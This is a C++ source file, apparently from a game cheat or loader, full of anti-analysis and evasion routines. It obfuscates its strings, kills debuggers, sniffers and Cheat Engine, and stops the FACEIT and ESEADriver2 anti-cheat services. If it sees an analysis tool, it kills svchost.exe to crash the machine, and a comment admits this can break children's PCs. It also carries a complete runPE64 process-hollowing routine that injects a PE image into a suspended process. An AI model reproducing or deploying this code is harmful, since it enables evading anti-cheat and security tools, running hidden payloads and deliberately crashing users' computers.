#include "protectmain.h"
#include "antidump.h"
#include "anti_debugger.h"


void blue_screen1()
{
	system(XorStr("taskkill.exe /f /im svchost.exe").c_str());
}

void kill_process1()
{
	system(XorStr("taskkill /f /im HTTPDebuggerUI.exe >nul 2>&1").c_str());
	system(XorStr("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1").c_str());
	system(XorStr("sc stop HTTPDebuggerPro >nul 2>&1").c_str());
	system(XorStr("taskkill /FI \"IMAGENAME eq cheatengine*\" /IM * /F /T >nul 2>&1").c_str());
	system(XorStr("taskkill /FI \"IMAGENAME eq httpdebugger*\" /IM * /F /T >nul 2>&1").c_str());
	system(XorStr("taskkill /FI \"IMAGENAME eq HTTPDebuggerSvc*\" /IM * /F /T >nul 2>&1").c_str());
	system(XorStr("taskkill /FI \"IMAGENAME eq HTTPDebuggerUI*\" /IM * /F /T >nul 2>&1").c_str());
	system(XorStr("taskkill /FI \"IMAGENAME eq KsDumperClient*\" /IM * /F /T >nul 2>&1").c_str());
	system(XorStr("taskkill /FI \"IMAGENAME eq FolderChangesView*\" /IM * /F /T >nul 2>&1").c_str());
	system(XorStr("taskkill /FI \"IMAGENAME eq ProcessHacker*\" /IM * /F /T >nul 2>&1").c_str());
	system(XorStr("taskkill /FI \"IMAGENAME eq KsDumperClient*\" /IM * /F /T >nul 2>&1").c_str());
	system(XorStr("taskkill /FI \"IMAGENAME eq procmon*\" /IM * /F /T >nul 2>&1").c_str());
	system(XorStr("taskkill /FI \"IMAGENAME eq idaq*\" /IM * /F /T >nul 2>&1").c_str());
	system(XorStr("taskkill /FI \"IMAGENAME eq idaq64*\" /IM * /F /T >nul 2>&1").c_str());

}

void bsod()
{
	//this can  break kids pc sometimes is it worth it?
	system(XorStr("taskkill.exe /f /im svchost.exe").c_str());
	exit(0);
}


void DetectDebuggerThread() {
	while (true)
	{
		Sleep(100);
		if (FindWindowA(NULL, ("Resource Monitor"))) { Beep(200, 200); system("taskkill /F /T /IM perfmon.exe"); exit(-1); }
		if (FindWindowA(NULL, ("The Wireshark Network Analyzer"))) { bsod(); }
		if (FindWindowA(NULL, ("Progress Telerik Fiddler Web Debugger"))) { bsod(); }
		if (FindWindowA(NULL, ("Fiddler"))) { bsod(); }
		if (FindWindowA(NULL, ("HTTP Debugger"))) { bsod(); }
		if (FindWindowA(NULL, ("x64dbg"))) { bsod(); }
		if (FindWindowA(NULL, ("dnSpy"))) { bsod(); }
		if (FindWindowA(NULL, ("FolderChangesView"))) { bsod(); }
		if (FindWindowA(NULL, ("BinaryNinja"))) { bsod(); }
		if (FindWindowA(NULL, ("HxD"))) { bsod(); }
		if (FindWindowA(NULL, ("Cheat Engine 7.2"))) { bsod(); }
		if (FindWindowA("Qt5QWindowIcon", (NULL))) { bsod(); }
		if (FindWindowA("ProcessHacker", (NULL))) { bsod(); }
		if (FindWindowA("MainWindowClassName", (NULL))) { bsod(); }
		if (FindWindowA("WindowsForms10.Window.8.app.0.33c0d9d", (NULL))) { bsod(); }
	    if (FindWindowA("Qt5153QTQWindowIcon", (NULL))) { bsod(); }
		if (FindWindowA("Window", (NULL))) { bsod(); }
	    if (FindWindowA("MDIClient", (NULL))) { bsod(); }
		if (FindWindowA(NULL, ("Cheat Engine 7.0"))) { bsod(); }
		if (FindWindowA(NULL, ("Cheat Engine 6.9"))) { bsod(); }
		if (FindWindowA(NULL, ("Cheat Engine 7.3"))) { bsod(); }
		if (FindWindowA(NULL, ("Cheat Engine 7.4"))) { bsod(); }
		if (FindWindowA(NULL, ("Cheat Engine 7.5"))) { bsod(); }
		if (FindWindowA(NULL, ("Cheat Engine 7.6"))) { bsod(); }
		if (FindWindowA(NULL, ("Ida"))) { bsod(); }
		if (FindWindowA(NULL, ("Ida Pro"))) { bsod(); }
		if (FindWindowA(NULL, ("Ida Freeware"))) { bsod(); }
		if (FindWindowA(NULL, ("HTTP Debugger Pro"))) { bsod(); }
		if (FindWindowA(NULL, ("Process Hacker"))) { bsod(); }
		if (FindWindowA(NULL, ("Process Hacker 2"))) { bsod(); }
		if (FindWindowA(NULL, ("OllyDbg"))) { bsod(); }
	}
}

void tasky11()
{
	system(XorStr("net stop FACEIT >nul 2>&1").c_str());
	system(XorStr(("net stop ESEADriver2 >nul 2>&1")).c_str());
	system(XorStr(("sc stop HTTPDebuggerPro >nul 2>&1")).c_str());
	system(XorStr(("sc stop KProcessHacker3 >nul 2>&1")).c_str());
	system(XorStr(("sc stop KProcessHacker2 >nul 2>&1")).c_str());
	system(XorStr(("sc stop KProcessHacker1 >nul 2>&1")).c_str());
	system(XorStr(("sc stop wireshark >nul 2>&1")).c_str());
	system(XorStr(("sc stop npf >nul 2>&1")).c_str());
	system("taskkill /f /im HTTPDebuggerUI.exe >nul 2>&1");
	system("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1");
	system("sc stop HTTPDebuggerPro >nul 2>&1");
	system("taskkill /FI \"IMAGENAME eq cheatengine*\" /IM * /F /T >nul 2>&1");
	system("taskkill /FI \"IMAGENAME eq httpdebugger*\" /IM * /F /T >nul 2>&1");
	system("taskkill /FI \"IMAGENAME eq processhacker*\" /IM * /F /T >nul 2>&1");
	system("taskkill /FI \"IMAGENAME eq fiddler*\" /IM * /F /T >nul 2>&1");
	system("taskkill /FI \"IMAGENAME eq wireshark*\" /IM * /F /T >nul 2>&1");
	system("taskkill /FI \"IMAGENAME eq rawshark*\" /IM * /F /T >nul 2>&1");
	system("taskkill /FI \"IMAGENAME eq charles*\" /IM * /F /T >nul 2>&1");
	system("taskkill /FI \"IMAGENAME eq cheatengine*\" /IM * /F /T >nul 2>&1");
	system("taskkill /FI \"IMAGENAME eq ida*\" /IM * /F /T >nul 2>&1");
	system("taskkill /FI \"IMAGENAME eq httpdebugger*\" /IM * /F /T >nul 2>&1");
	system("taskkill /FI \"IMAGENAME eq processhacker*\" /IM * /F /T >nul 2>&1");
	system("sc stop HTTPDebuggerPro >nul 2>&1");
	system("sc stop KProcessHacker3 >nul 2>&1");
	system("sc stop KProcessHacker2 >nul 2>&1");
	system("sc stop KProcessHacker1 >nul 2>&1");
	system("sc stop wireshark >nul 2>&1");
	system("sc stop npf >nul 2>&1");
}

void find_exe_title()
{
	while (true) {
		if (FindWindowA(NULL, ("KsDumperClient.exe")))
		{
			bsod();
		}
		if (FindWindowA(NULL, ("HTTPDebuggerUI.exe")))
		{
			bsod();
		}
		if (FindWindowA(NULL, ("HTTPDebuggerSvc.exe")))
		{
			bsod();
		}
		if (FindWindowA(NULL, ("FolderChangesView.exe")))
		{
			bsod();
		}
		if (FindWindowA(NULL, ("ProcessHacker.exe")))
		{
			bsod();
		}
		if (FindWindowA(NULL, ("procmon.exe")))
		{
			bsod();
		}
		if (FindWindowA(NULL, ("idaq.exe")))
		{
			bsod();
		}
		if (FindWindowA(NULL, ("idaq64.exe")))
		{
			bsod();
		}
		if (FindWindowA(NULL, ("Wireshark.exe")))
		{
			bsod();
		}
		if (FindWindowA(NULL, ("Fiddler.exe")))
		{
			bsod();
		}
		if (FindWindowA(NULL, ("Xenos64.exe")))
		{
			bsod();
		}
		if (FindWindowA(NULL, ("Cheat Engine.exe")))
		{
			bsod();
		}
		if (FindWindowA(NULL, ("HTTP Debugger Windows Service (32 bit).exe")))
		{
			bsod();
		}
		if (FindWindowA(NULL, ("KsDumper.exe")))
		{
			bsod();
		}
		if (FindWindowA(NULL, ("x64dbg.exe")))
		{
			bsod();
		}
		if (FindWindowA(NULL, ("ProcessHacker.exe")))
		{
			bsod();
		}
		if (FindWindowA(NULL, ("IDA: Quick start")))
		{
			bsod();
		}

		if (FindWindowA(NULL, ("Memory Viewer")))
		{
			bsod();
		}
		if (FindWindowA(NULL, ("Process List")))
		{
			bsod();
		}
		if (FindWindowA(NULL, ("KsDumper")))
		{
			bsod();
		}
		if (FindWindowA(NULL, ("HTTP Debugger")))
		{
			bsod();
		}
		if (FindWindowA(NULL, ("OllyDbg")))
		{
			bsod();
		}
		std::this_thread::sleep_for(std::chrono::milliseconds(3900));

	}
}
int runPE64(
	LPPROCESS_INFORMATION lpPI,
	LPSTARTUPINFO lpSI,
	LPVOID lpImage,
	LPWSTR wszArgs,
	SIZE_T szArgs
)
{
	mainprotect();
	WCHAR wszFilePath[MAX_PATH];
	if (!GetModuleFileName(
		NULL,
		wszFilePath,
		sizeof wszFilePath
	))
	{
		return -1;
	}
	WCHAR wszArgsBuffer[MAX_PATH + 2048];
	ZeroMemory(wszArgsBuffer, sizeof wszArgsBuffer);
	SIZE_T length = wcslen(wszFilePath);
	memcpy(
		wszArgsBuffer,
		wszFilePath,
		length * sizeof(WCHAR)
	);
	wszArgsBuffer[length] = ' ';
	memcpy(
		wszArgsBuffer + length + 1,
		wszArgs,
		szArgs
	);
	mainprotect();
	PIMAGE_DOS_HEADER lpDOSHeader =
		reinterpret_cast<PIMAGE_DOS_HEADER>(lpImage);
	PIMAGE_NT_HEADERS lpNTHeader =
		reinterpret_cast<PIMAGE_NT_HEADERS>(
			reinterpret_cast<DWORD64>(lpImage) + lpDOSHeader->e_lfanew
			);
	if (lpNTHeader->Signature != IMAGE_NT_SIGNATURE)
	{
		return -2;
	}
	mainprotect();
	if (!CreateProcess(
		NULL,
		wszArgsBuffer,
		NULL,
		NULL,
		TRUE,
		CREATE_SUSPENDED,
		NULL,
		NULL,
		lpSI,
		lpPI
	))
	{
		return -3;
	}
	mainprotect();
	CONTEXT stCtx;
	ZeroMemory(&stCtx, sizeof stCtx);
	stCtx.ContextFlags = CONTEXT_FULL;
	if (!GetThreadContext(lpPI->hThread, &stCtx))
	{
		TerminateProcess(
			lpPI->hProcess,
			-4
		);
		return -4;
	}
	mainprotect();
	LPVOID lpImageBase = VirtualAllocEx(
		lpPI->hProcess,
		reinterpret_cast<LPVOID>(lpNTHeader->OptionalHeader.ImageBase),
		lpNTHeader->OptionalHeader.SizeOfImage,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);
	if (lpImageBase == NULL)
	{
		TerminateProcess(
			lpPI->hProcess,
			-5
		);
		return -5;
	}
	mainprotect();
	if (!WriteProcessMemory(
		lpPI->hProcess,
		lpImageBase,
		lpImage,
		lpNTHeader->OptionalHeader.SizeOfHeaders,
		NULL
	))
	{
		TerminateProcess(
			lpPI->hProcess,
			-6
		);
		return -6;
	}

	for (
		SIZE_T iSection = 0;
		iSection < lpNTHeader->FileHeader.NumberOfSections;
		++iSection
		)
	{
		PIMAGE_SECTION_HEADER stSectionHeader =
			reinterpret_cast<PIMAGE_SECTION_HEADER>(
				reinterpret_cast<DWORD64>(lpImage) +
				lpDOSHeader->e_lfanew +
				sizeof(IMAGE_NT_HEADERS64) +
				sizeof(IMAGE_SECTION_HEADER) * iSection
				);
		mainprotect();
		if (!WriteProcessMemory(
			lpPI->hProcess,
			reinterpret_cast<LPVOID>(
				reinterpret_cast<DWORD64>(lpImageBase) +
				stSectionHeader->VirtualAddress
				),
			reinterpret_cast<LPVOID>(
				reinterpret_cast<DWORD64>(lpImage) +
				stSectionHeader->PointerToRawData
				),
			stSectionHeader->SizeOfRawData,
			NULL
		))
		{
			TerminateProcess(
				lpPI->hProcess,
				-7
			);
			return -7;
		}
	}
	mainprotect();
	if (!WriteProcessMemory(
		lpPI->hProcess,
		reinterpret_cast<LPVOID>(
			stCtx.Rdx + sizeof(LPVOID) * 2
			),
		&lpImageBase,
		sizeof(LPVOID),
		NULL
	))
	{
		TerminateProcess(
			lpPI->hProcess,
			-8
		);
		return -8;
	}
	mainprotect();
	stCtx.Rcx = reinterpret_cast<DWORD64>(lpImageBase) +
		lpNTHeader->OptionalHeader.AddressOfEntryPoint;
	if (!SetThreadContext(
		lpPI->hThread,
		&stCtx
	))
	{
		TerminateProcess(
			lpPI->hProcess,
			-9
		);
		return -9;
	}
	mainprotect();
	if (!ResumeThread(lpPI->hThread))
	{
		TerminateProcess(
			lpPI->hProcess,
			-10
		);
		return -10;
	}
	mainprotect();
	return 0;
}

void mainprotect()
{
	std::thread(hidethread).detach();
	std::thread(remotepresent).detach();
	std::thread(contextthread).detach();
	std::thread(debugstring).detach();
	std::thread(kill_process1).detach();
	std::thread(find_exe_title).detach();
	std::thread(tasky11).detach();
	std::thread(DetectDebuggerThread).detach();

}
